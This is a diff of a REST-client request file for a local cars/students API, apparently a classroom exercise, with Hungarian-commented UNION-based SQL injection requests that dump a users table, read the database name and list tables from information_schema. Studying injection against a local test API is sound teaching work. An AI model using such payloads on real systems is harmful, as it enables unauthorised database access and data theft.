@@ -1,18 +1,18 @@
 
-### get all cars
-get http://localhost:3000/cars
+### get all participants
+get http://localhost:3000/students
 
 
-### get car by id
-get http://localhost:3000/cars/1
+### get student by id
+get http://localhost:3000/students/1
 
 
 ### sql injections
 ### get users tábla információk
-get http://localhost:3000/cars/2 UNION SELECT *, '' FROM users
+get http://localhost:3000/students/2 UNION SELECT *, '' FROM users
 
 ### get mi az adatbázis neve
-get http://localhost:3000/cars/2  UNION SELECT database(), '','',''
+get http://localhost:3000/students/2  UNION SELECT database(), '','',''
 
 ### get milyen táblák vannak
 get http://localhost:3000/cars/222  UNION select table_name, '','','' from information_schema.tables where table_schema='taxi6'
@@ -31,7 +31,7 @@ Content-Type: application/json
 }
 
 ### delete car by id
-delete http://localhost:3000/cars/1002
+delete http://localhost:3000/cars/68
 
 ### put car
 put http://localhost:3000/cars/77
